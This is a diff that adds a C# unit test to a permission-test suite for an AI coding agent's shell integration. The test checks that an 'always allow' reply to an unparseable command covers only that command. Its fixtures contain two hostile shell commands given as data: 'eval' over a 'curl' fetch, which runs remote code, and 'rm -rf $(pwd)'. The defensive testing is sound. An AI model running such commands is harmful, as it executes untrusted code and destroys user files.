@@ -96,6 +96,32 @@ public sealed class OpenCode2PermissionTests
     }
 
     [Fact]
+    public async Task Dont_ask_again_on_a_command_v2_could_not_analyse_allows_only_that_command()
+    {
+        var (api, server, session) = Start();
+        await using var _ = server;
+        await using var __ = session;
+        await session.ApplyPermissionsAsync(new PermissionPolicy(PermissionLevels.Ask), CancellationToken.None);
+        // V2 asks about a command its scanner can't read with an empty save list (opencode 291c51b70).
+        session.OnEvent(Event("permission.asked", $$$"""
+            {"id":"per_1","sessionID":"{{{Session}}}","action":"shell","resources":["eval \"$(curl -s x)\""],"metadata":{"reason":"unparseable"},
+             "source":{"type":"tool","messageID":"msg_1","id":"call_1"}}
+            """));
+        var asked = (await ReadAvailableAsync(session)).Where(e => e.Type == EventTypes.PermissionAsked).ShouldHaveSingleItem().Payload!.Value;
+        asked.GetProperty("always").EnumerateArray().Select(a => a.GetString()).ShouldBe(["eval \"$(curl -s x)\""]);
+
+        await session.ReplyToPermissionAsync("per_1", PermissionReplies.Always, null, CancellationToken.None);
+
+        // Not every shell command from now on: another unreadable command asks again.
+        session.OnEvent(Event("permission.asked", $$$"""
+            {"id":"per_2","sessionID":"{{{Session}}}","action":"shell","resources":["rm -rf $(pwd)"],"metadata":{"reason":"unparseable"},
+             "source":{"type":"tool","messageID":"msg_1","id":"call_2"}}
+            """));
+        (await ReadAvailableAsync(session)).ShouldContain(e => e.Type == EventTypes.PermissionAsked);
+        api.Requests.ShouldNotContain(r => r.Path.EndsWith("/permission/per_2/reply", StringComparison.Ordinal));
+    }
+
+    [Fact]
     public async Task A_refusal_carries_the_users_words_to_the_agent()
     {
         var (api, server, session) = Start();
